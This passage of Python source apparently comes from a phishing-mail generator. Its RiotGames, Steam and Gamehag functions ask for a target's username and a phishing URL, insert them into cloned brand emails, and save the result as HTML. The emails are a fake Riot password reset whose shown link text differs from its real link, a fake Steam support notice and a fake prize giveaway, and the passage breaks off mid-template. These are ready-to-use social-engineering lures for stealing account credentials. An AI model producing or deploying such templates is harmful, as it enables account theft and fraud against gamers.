					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#0f2745;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:30px;padding-left:50px;padding-right:50px">
											<table width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="text-align:left">
														<div style="margin-right:auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#ffffff;font-size:14px;line-height:1.3;max-width:600px">© 2019 DreamTeam. All rights reserved.
															<br> You are receiveing this email because you opted in at our website.
															<br>
														</div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>



					<table style="width:100%;border-collapse:collapse;border-spacing:0;margin:0;border:0" cellspacing="0" cellpadding="0">
						<tbody><tr>
							<td style="padding-left:15px;padding-right:15px">
								<table style="margin:0 auto;background-color:#16253d;border-spacing:0;width:600px" align="center">
									<tbody><tr>
										<td style="padding-top:15px;padding-bottom:30px;padding-left:50px;padding-right:50px">
											<table style="width:100%" valign="top" width="100%" cellspacing="0" cellpadding="0" border="0">
												<tbody><tr>
													<td style="text-align:center;padding:0 0 0">
														<div style="margin-right:auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#444444;font-size:14px;line-height:1.3;max-width:600px;padding-bottom:10px">DreamTeam, 2454 Centennial Towers, Suite 205C, West Bay Road, West Bay, Grand Cayman, KY1-1303, Cayman Islands

														</div>

														<div style="margin:0 auto;font-weight:normal;font-family:Helvetica Neue,Helvetica,Arial,sans-serif;color:#8c8c8c;font-size:14px;line-height:1.3;max-width:350px"><a target="_blank" style="color:#0077cc!important;text-decoration:none;border-bottom:1px solid #0077cc" href="{}">Unsubscribe</a></div>

													</td>

												</tr>

											</tbody></table>

										</td>

									</tr>

								</tbody></table>

							</td>

						</tr>

					</tbody></table>


				</td>

			</tr>

		</tbody></table>


	<img style="display:block;width:1px!important;min-width:1px!important;max-width:1px!important;height:1px!important;border:0;overflow:hidden" src="https://dreamteam21599.emlnk1.com/lt.php?nl=2&amp;c=202&amp;m=340&amp;s=ed8fa103941dbfb0cd8442bbd9a8c886&amp;l=open" width="1" height="1" border="0"><br clear="all"></div>


	</div></div>""".format(name, Url, Url, Url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

	
def RiotGames():
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingUrl: ")
	
	print("")
	print(start + " Pick A Server Your Target Is Having His RiotGames Account On")
	print(green + "[" + white + "1" + green + "]" + white + "    »" + blue + " Brazil (BR)" + white + " «")
	print(green + "[" + white + "2" + green + "]" + white + "    »" + blue + " Europe Nordic & East (EUNE)" + white + " «")
	print(green + "[" + white + "3" + green + "]" + white + "    »" + blue + " Europe West (EUW)" + white + " «")
	print(green + "[" + white + "4" + green + "]" + white + "    »" + blue + " Latin America North (LAN)" + white + " «")
	print(green + "[" + white + "5" + green + "]" + white + "    »" + blue + " Latin America South (LAS)" + white + " «")
	print(green + "[" + white + "6" + green + "]" + white + "    »" + blue + " North America (NA)" + white + " «")
	print(green + "[" + white + "7" + green + "]" + white + "    »" + blue + " Oceania (OCE)" + white + " «")
	print(green + "[" + white + "8" + green + "]" + white + "    »" + blue + " Russia (RU)" + white + " «")
	print(green + "[" + white + "9" + green + "]" + white + "    »" + blue + " Japan (JP)" + white + " «")
	print(green + "[" + white + "10" + green + "]" + white + "   »" + blue + " Turkey (TR)" + white + " «")
	print(green + "[" + white + "11" + green + "]" + white + "   »" + blue + " Republic of Korea (KR)" + white + " «")
	print("")
	ServerPick = int(input("root@phishmailer/RiotGames/Server:~ "))
	
	if ServerPick == 1:
		ServerRiot = ("Brazil (BR)")
	
	elif ServerPick == 2:
		ServerRiot = ("Europe Nordic & East (EUNE)")
		
	elif ServerPick == 3:
		ServerRiot = ("Europe West (EUW)")
	
	elif ServerPick == 4:
		ServerRiot = ("Latin America North (LAN)")
		
	elif ServerPick == 5:
		ServerRiot = ("Latin America South (LAS)")
		
	elif ServerPick == 6:
		ServerRiot = ("North America (NA)")
		
	elif ServerPick == 7:
		ServerRiot = ("Oceania (OCE)")
		
	elif ServerPick == 8:
		ServerRiot = ("Russia (RU)")
		
	elif ServerPick == 9:
		ServerRiot = ("Japan (JP)")
		
	elif ServerPick == 10:
		ServerRiot = ("Turkey (TR)")
		
	elif ServerPick == 11:
		ServerRiot = ("Republic ok Korea (KR)")
	
	else:
		print("")
		print(alert + " Invalid Option Going With Default")
		print(alert + " North America (NA)")
		ServerRiot = ("North America (NA)")
		
	print(start + " Server Picked: " + ServerRiot)
		
	source = ("""
	<div style="margin:0px;padding:0px;font-family:'Avenir Book',sans-serif;line-height:100%">

	<table style="table-layout:fixed;border-collapse:separate;background-color:#000000;width:100%;min-width:100%" cellspacing="0" cellpadding="0" border="0" align="center">
		  <tbody><tr>
			  <td style="border-collapse:separate;table-layout:fixed" align="center">

				  <table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0">
					  <tbody><tr>
						  <td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="20">&nbsp;</td>
					  </tr>
				  </tbody></table>


				  <table style="width:600px;table-layout:fixed;border-collapse:separate;min-width:600px" width="600" cellspacing="0" cellpadding="0" border="0" align="center">
					  <tbody><tr>

						  <td style="border-collapse:separate;table-layout:fixed" valign="top" bgcolor="#E7E6E3" align="center">
							  <img style="max-width:600px;border:none;display:block;outline:none!important" src="https://marketing-image-production.s3.amazonaws.com/uploads/0c2d0b72bc24db205d96cf3ee7a8b3d4a8c8625056c35d883e78046176cf8d9ad6c913e7e0dd0cb7fc5ca9ad48c718d5d09b30a7c0a8d558e98a5c90558514d3.jpg" width="600">
						  </td>
					  </tr>
				  </tbody></table>
			  </td>
		  </tr>
	  </tbody></table>

	<table style="table-layout:fixed;border-collapse:separate;background-color:#000000;width:100%;min-width:100%" cellspacing="0" cellpadding="0" border="0" align="center">
	<tbody><tr>
		<td style="border-collapse:separate;table-layout:fixed" align="center">
			<table style="width:600px;table-layout:fixed;border-collapse:separate;min-width:600px" width="600" cellspacing="0" cellpadding="0" border="0" align="center">
				<tbody><tr>
					<td style="border-collapse:separate;table-layout:fixed;padding-top:30px" bgcolor="#E7E6E3" align="center">


	<table style="table-layout:fixed;border-collapse:separate;width:90%" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="padding-bottom:20px;border-collapse:separate;table-layout:fixed;font-family:Avenir,sans-serif;font-size:31px;line-height:32px;color:#1a1a18;text-decoration:none;font-weight:normal" align="center">
				Password Change Request<br>
			</td>
		</tr>
		<tr>
			<td style="padding-bottom:20px;border-collapse:separate;table-layout:fixed;font-family:Avenir,sans-serif;font-size:18px;line-height:20px;color:#000000" align="left">
				We've received a password change request for your Riot Games account.<br><br>
				This link will expire in 24 hours. If you did not request a password change, please ignore this email, no changes will be made to your account. Another player may have entered your username by mistake, but we encourage you to view our tips for <a target="_blank" style="text-decoration:none" href="{}"><font color="252726"><u>Protecting Your Account</u></font></a> if you have any concerns.
			</td>
		</tr>
	</tbody></table>
	<table cellspacing="0" cellpadding="0" border="0" align="center">
		<tbody><tr>
			<td style="background-color:#d9d8d4;font-family:Avenir,sans-serif;font-size:18px;color:#000000;text-decoration:none;font-weight:normal;line-height:20px;padding:20px 0px" valign="middle" align="center">

				<div>
				  {}
	<br>
				  <b style="font-size:30px;line-height:36px">{}</b><br><br>
				  To change your password, click the link below: <br>
				  <b><a target="_blank" href="{}">https://www.recovery.riotgames.com/</a></b><br><br>
				</div>
			</td>
		</tr>
	</tbody></table>
	<table style="table-layout:fixed;border-collapse:separate;width:90%" cellspacing="0" cellpadding="0" border="0">
		<tbody><tr>
			<td style="padding:20px 0px 40px 0px;border-collapse:separate;table-layout:fixed;font-family:Avenir,sans-serif;font-size:18px;line-height:20px;color:#000000" align="center">
				For more information on your account - please visit your <a target="_blank" style="text-decoration:none" href="{}"><font color="252726"><u>Account Management</u></font></a> page.<br><br>
				GLHF,<br>Riot Games<br>
			</td>
		</tr>
	</tbody></table>

		<table style="table-layout:fixed;border-collapse:separate;background-color:#000000;width:100%;min-width:100%" cellspacing="0" cellpadding="0" border="0" align="center">
			<tbody><tr>
				<td style="border-collapse:separate;table-layout:fixed" align="center">
					<table style="width:600px;table-layout:fixed;border-collapse:separate;min-width:600px" width="600" cellspacing="0" cellpadding="0" border="0" align="center">
						<tbody><tr>
							<td style="border-collapse:separate;table-layout:fixed" valign="top" align="center">
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="30">&nbsp;</td></tr></tbody></table>
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="30">&nbsp;</td></tr></tbody></table>

								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0">
									<tbody><tr>

										<td style="border-collapse:separate;table-layout:fixed" align="center">
											<a target="_blank" style="border-collapse:seperate" href="{}"><img style="border:none;display:block;outline:none!important" alt src="https://marketing-image-production.s3.amazonaws.com/uploads/9264a8a85af2394d39aa5d9a318c516433da14d716c838ea60252f79a40a367a1bb61d36a4e0c42742fde5c751097f2103c489d6abe446c5768d0a19e6a03224.png" width="150" border="0"></a>
										</td>

									</tr>
								</tbody></table>
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="40">&nbsp;</td></tr></tbody></table>
								<table style="border-top:1px solid #8a8887;border-bottom:1px solid #8a8887;table-layout:fixed;border-collapse:separate;width:90%" cellspacing="0" cellpadding="0" border="0">
									<tbody><tr>
										<td style="border-collapse:separate;table-layout:fixed" align="center">
											<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="10">&nbsp;</td></tr></tbody></table><table style="table-layout:fixed;border-collapse:separate" width="100%" cellspacing="0" cellpadding="0" border="0" align="center">
												<tbody><tr>
													<td style="border-collapse:separate;table-layout:fixed;font-size:13px;line-height:16px;color:#aaaaaa;text-decoration:none" valign="top" align="center">
														<a target="_blank" style="border-collapse:seperate;font-size:13px;line-height:16px;color:#aaaaaa;text-decoration:none" href="{}">Privacy Policy</a> <span><span>  &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span>
														<a target="_blank" style="border-collapse:seperate;font-size:13px;line-height:16px;color:#aaaaaa;text-decoration:none" href="{}">Terms of Use</a> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
														<a target="_blank" style="border-collapse:seperate;font-size:13px;line-height:16px;color:#aaaaaa;text-decoration:none" href="{}">Support</a>
													</td>
												</tr>
											</tbody></table>
											<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="10">&nbsp;</td></tr></tbody></table>
										</td>
									</tr>
								</tbody></table>
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="40">&nbsp;</td></tr></tbody></table>
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0">
									<tbody><tr>

										<td style="border-collapse:separate;table-layout:fixed;padding-right:20px" width="40" valign="middle" align="center"><a target="_blank" style="border-collapse:seperate" href="{}"><img style="border:none;display:block;outline:none!important" alt src="https://marketing-image-production.s3.amazonaws.com/uploads/52728ad0f2f00456e31e406dcff8062127bfc192375ebf3bcf78729c65e42ab80786d04711968db7a47496bb3a1192b0f85a367964200a51e4758505282c8fe8.png" width="31" border="0"></a></td>
										<td style="border-collapse:separate;table-layout:fixed;padding-right:20px" width="40" valign="middle" align="center"><a target="_blank" style="border-collapse:seperate" href="{}"><img style="border:none;display:block;outline:none!important" alt src="https://marketing-image-production.s3.amazonaws.com/uploads/e3f0cd088957d217e59b2972ada3d29ff921252a56558d8a0c69484a77b7c5da5f4165cd5c58261d4c7616ef7e984d3d5a623e78e4df02541f065be7c66f8254.png" width="31" border="0"></a></td>
										<td style="border-collapse:separate;table-layout:fixed;padding-right:20px" width="40" valign="middle" align="center"><a target="_blank" style="border-collapse:seperate" href="{}"><img style="border:none;display:block;outline:none!important" alt src="https://marketing-image-production.s3.amazonaws.com/uploads/a3c691df99cf8e4d07fea5d3c56cc92e2e1a33bdc4bfa47918aeb512c74a186e650079145ce663b3fd8464ac5ce73a1d827638272d4ba483a660847ffaee37a1.png" width="31" border="0"></a></td>
										<td style="border-collapse:separate;table-layout:fixed" width="40" valign="middle" align="center"><a target="_blank" href="{}"><img alt src="https://marketing-image-production.s3.amazonaws.com/uploads/854e0ad4e78a49a60db764700ae42968f2b140ec66bcfb69737254ebeb94544b6504bc2a56ec40dbba67aeb34ac4ee2cea934ce8b1fe34c599c80f8aa852f4eb.png" width="31" height="31"></a></td>
									</tr>
								</tbody></table>
								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="40">&nbsp;</td></tr></tbody></table>
								<table style="width:540px;table-layout:fixed;border-collapse:separate" width="540" cellspacing="0" cellpadding="0" border="0">
									<tbody><tr>
										<td style="border-collapse:separate;table-layout:fixed;font-size:13px;line-height:16px;color:#aaaaaa;text-decoration:none" valign="top" align="center">
											This is a service notification mailing.<br>© Riot Games. All rights reserved<br>Riot Games, Ltd., P.O. Box 11989, Dublin 2, IRELAND
										</td>
									</tr>
								</tbody></table>


								<table style="table-layout:fixed;border-collapse:separate" cellspacing="0" cellpadding="0" border="0"><tbody><tr><td style="border-collapse:separate;table-layout:fixed;font-size:1px;line-height:1px" height="30">&nbsp;</td></tr></tbody></table>
							</td>
						</tr>
					</tbody></table>
				</td>
			</tr>
		</tbody></table>

	<img style="height:1px!important;width:1px!important;border-width:0!important;margin-top:0!important;margin-bottom:0!important;margin-right:0!important;margin-left:0!important;padding-top:0!important;padding-bottom:0!important;padding-right:0!important;padding-left:0!important" alt src="https://links.riotgames.com/wf/open?upn=uE2BIySqUe8uNKMRBCm6cLv2KjGjfMtWQ-2FOXWMVw54M25D44dM5STcYcePYSQNZ8BuMoqSAKVZAtgAoNB4dS8o-2FMyxq09Fhi6LGBOygdMWNWkv2RE5MIg-2BJKA3aiSOLOb5GTIUz68HUBs89LZp03oQ6mXBUuJOYZEaqcDAX0IR-2B1MlSF2pC64K-2Bh8V6ak8qTY8JalX-2FORcUknVHGNvlLiRrRYrZkd6X4645cpYpTfjfFRxMlDMwcu2emIdgJJtNMrWzUeJN4aP3v-2F7wPY8dU9XphCXs5rsYzX8FUsCWGrEkW4tMg-2BtXpHVVSgQYFm62NYdK3VGHgqM1ptd2-2BujncXG-2BT3BwGIxdqLmtOqOfgLA2QUvr0v56ATk14E72hiyA10U7-2BB7RMAy5ZHdDrFf8IxS-2BrPjwSMP5yUqjHEkQaAz45zDmHwX-2BNpFxgGoEfpsLTDy5putoKrHaEC56804Tq9-2Fv10BhcXb3TwPQ-2B6zxBELL6kiVdMvwcrfEDXzC3Y-2Fr3bwFITZ9qqEnFcpiaVSzH90-2FH-2FalttSLeeCneUJ8t-2FeYWCHnlbz8SnC-2FSjSN9gi54tEOvYLCOmJGIkepalWEjxCLAL-2BHTDwMXQE21GhIupW2-2B-2BYOG-2BPgMxiUL-2FxuiWtM3H17fEDXTT6PMDPnaxGCurwMbLUzlSu3VE9KUCM3CMdgHCM-2BEdZcfI6okwvARrt-2BVM2eZyqZ929BB58SpzLcDNmrfCJj5aXn2THtKKtFPexCibEVd2imy1yRD3qFzY1ECUYA2ADgd4vZ0H2FdKG3e0r8SUEnUZSi3GuW-2B9q6XDSSc2xvnPtJJaF8V6p4vR4TuFMDNXYFHsWM2LXAq5w-2F9J7hV86D0odMCRwo9c2za3hAtJt91uGkQ7OfWHn5t1A4hSxKm38nvsDOyxUHwgAdvqY-2BS5Ewl4kwCnfpX3KVZkL57cjZQKOQSdEBOXNRLI-2FCJr-2B0xqGH2zNObKabp4EU8nvxv-2BdLugVvTTOueBjmOYFk-3D" width="1" height="1" border="0">
	</td></tr></tbody></table></td></tr></tbody></table></div>



	</div></div>""".format(Url, ServerRiot, username, Url, Url, Url, Url, Url, Url, Url, Url, Url, Url))

	
	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def Steam():
	username = input(start + " Enter Target Username: ")
	Url = input(start + " Enter Your PhishingUrl: ")
	
	source = ("""
	<div style="font-family:Helvetica,Arial,sans-serif;font-size:14px;color:#c6d4df" bgcolor>
	<table style="width:538px;background-color:#393836" cellspacing="0" cellpadding="0" align="center">
		<tbody><tr>
			<td style="height:65px;background-color:#171a21;border-bottom:1px solid #4d4b48">
				<img alt="Steam" src="https://help.steampowered.com/public/shared/images/email/email_header_logo.png" width="538" height="65">
			</td>
		</tr>
		<tr>
			<td bgcolor="#17212e">
				<table style="padding-left:5px;padding-right:5px" width="470" cellspacing="0" cellpadding="0" border="0" align="center">


					<tbody><tr bgcolor="#17212e">
						<td style="padding-top:32px">
							<span style="font-size:24px;color:#66c0f4;font-family:Arial,Helvetica,sans-serif;font-weight:bold">
																Hello {}													</span>
							<br>
							<div style="padding-top:12px">
								<span style="font-size:17px;color:#c6d4df;font-family:Arial,Helvetica,sans-serif;font-weight:bold">
									You got a new message from the Steam-team							</span>
							</div>
						</td>
					</tr>

					<tr><td style="height:20px;line-height:20px">&nbsp;</td></tr>
					<tr>
						<td>
							<table style="padding:14px" width="458" cellspacing="0" cellpadding="0" border="0" bgcolor="#121a25" align="center">
								<tbody><tr>
									<td>
										<a target="_blank" href="{}" style="color:#67c1f5">
											Click here to show the message									</a>
									</td>
								</tr>
							</tbody></table>
						</td>
					</tr>

					<tr>
						<td style="font-size:12px;color:#c6d4df;padding-top:16px">
							This is an automatic email and replies will not be read. If you want to update your request, use the link below to do so.					</td>
					</tr>

					<tr>
						<td style="font-size:12px;color:#6d7880;padding-top:16px;padding-bottom:60px">
														Steam support<br>
								<a target="_blank" href="{}" style="color:#8f98a0">https://help.steampowered.com/</a><br>
												</td>
					</tr>

				</tbody></table>
			</td>
		</tr>
		<tr style="background-color:#000000">
			<td style="padding:12px 24px">
				<table cellspacing="0" cellpadding="0">
					<tbody><tr>
						<td width="92">
							<img alt="Valve®" src="https://help.steampowered.com/public/shared/images/email/footerLogo_valve.png" width="96" height="26">
						</td>
						<td style="font-size:11px;color:#595959;padding-left:12px">
							© Valve Corporation. PO Box 1688 Bellevue, WA 98009.<br>
							All Rights Reserved. All trademarks are the property of their respective owners in the United States and other countries.					</td>
					</tr>
				</tbody></table>
			</td>
		</tr>
	</tbody></table>

	</div>


	</div></div>""".format(username, Url, Url))

	filename = input(start + " Enter Name On HTML File To Save: ")
	Html_file = open(filename + ".html","w")
	Html_file.write(source)
	Html_file.close()
	print(alert + " HTML File Created")

def Gamehag():
	Url = input(start + " Enter Your Phishing Url: ")
	
	source = ("""
	<div style="width:100%;margin:0px;padding:0px;background-color:#dbe5ea">


		<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
				<td style="display:none;font-size:0;max-height:0;width:0;line-height:0;overflow:hidden" align="center">
								</td>
			</tr>
		</tbody>
	</table>

	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px;padding-top:32px" align="center">

					<table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr>
								<td style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:16px;line-height:24px;background-color:#242b3d;border-radius:4px 4px 0px 0px;padding-left:16px;padding-right:16px;padding-top:24px;padding-bottom:24px" align="center">
									<p style="margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#ffffff" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;max-width:136px" alt="Gamehag" src="https://gamehag.com/img/mails/logo_white.png" width="136" height="36"></a></p>
								</td>
							</tr>
						</tbody>
					</table>

				</td>
			</tr>
		</tbody>
	</table>


	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
		  <tr>
			<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

			  <table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
				<tbody>
				  <tr>
					<td style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:16px;line-height:24px;background-color:#ffffff;color:#424651" align="center">
					  <p style="margin-top:0px;margin-bottom:0px"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;width:100%;max-width:800px" alt src="https://statimg.gamehag.com/m/4weekend2021/top1.png" width="800" height="352"></p>
					</td>
				  </tr>
				</tbody>
			  </table>

			</td>
		  </tr>
		</tbody>
	  </table>
	<table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			  <tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

				  <table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
					<tbody>
					  <tr>
						<td style="background-color:#ffffff;padding-left:24px;padding-right:24px;padding-top:64px;padding-bottom:64px" align="center">

						  <div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:19px;line-height:28px;max-width:584px;color:#82899a;text-align:center">
							<h1 style="font-family:Helvetica,Arial,sans-serif;font-weight:bold;margin-top:0px;color:#242b3d;font-size:36px;line-height:47px;margin-bottom:4px">500 000 Soul Gems awaits!</h1>
							<p style="margin-top:0px;margin-bottom:0px">It’s Weekend again, and you again have the chance to win half a million Soul Gems. Open the chest and win 500K KD or other prizes:</p>
						  </div>

						</td>
					  </tr>
					</tbody>
				  </table>

				</td>
			  </tr>
			</tbody>
		  </table>
	<table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			  <tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

				  <table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
					<tbody>
					  <tr>
						<td style="font-size:0;vertical-align:top;background-color:#ffffff;padding-left:16px;padding-right:16px" align="center">

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/minecraft.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">Minecraft</b></a></p>
							</div>
						  </div>

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/sims4.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">The Sims 4</b></a></p>
							</div>
						  </div>

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/overwatch.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">Overwatch</b></a></p>
							</div>
						  </div>

						</td>
					  </tr>
					</tbody>
				  </table>

				</td>
			  </tr>
			</tbody>
		  </table>
	<table width="100%" cellspacing="0" cellpadding="0" border="0">
			<tbody>
			  <tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

				  <table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
					<tbody>
					  <tr>
						<td style="font-size:0;vertical-align:top;background-color:#ffffff;padding-left:16px;padding-right:16px" align="center">

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/rainbow.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">Tom Clancy's Rainbow Six Siege</b></a></p>
							</div>
						  </div>

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/thedivision.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">The Division 2</b></a></p>
							</div>
						  </div>

						  <div style="display:inline-block;vertical-align:top;width:100%;max-width:200px">
							<div style="font-size:32px;line-height:32px;height:32px">&nbsp; </div>
							<div style="font-family:Helvetica,Arial,sans-serif;margin-top:0px;margin-bottom:0px;font-size:14px;line-height:21px;color:#82899a;text-align:center;padding-left:8px;padding-right:8px">
							  <p style="margin-top:0px;margin-bottom:16px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#21e7b6" href="{}"><img style="vertical-align:middle;border:0;line-height:100%;height:auto;outline:none;text-decoration:none;border-radius:4px;max-width:184px" alt src="https://statimg.gamehag.com/m/4weekend2021/more1.png" width="184" height="184"></a>
							  </p>
							  <p style="font-size:16px;line-height:24px;margin-top:0px;margin-bottom:0px"><a target="_blank" style="text-decoration:none;word-break:break-word;outline:none;color:#242b3d" href="{}">
								<b style="color:#242b3d">and much more!</b></a></p>
							</div>
						  </div>

						</td>
					  </tr>
					</tbody>
				  </table>

				</td>
			  </tr>
			</tbody>
		  </table>

	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
				<td style="background-color:#dbe5ea;padding-left:8px;padding-right:8px" align="center">

					<table style="max-width:800px;margin:0 auto" width="100%" cellspacing="0" cellpadding="0" border="0">
						<tbody>
							<tr>
								<td style="background-color:#ffffff;font-size:24px;line-height:24px;height:24px">&nbsp;
								</td>
							</tr>
						</tbody>
					</table>

				</td>
			</tr>
		</tbody>
	</table>

	<table width="100%" cellspacing="0" cellpadding="0" border="0">
		<tbody>
			<tr>
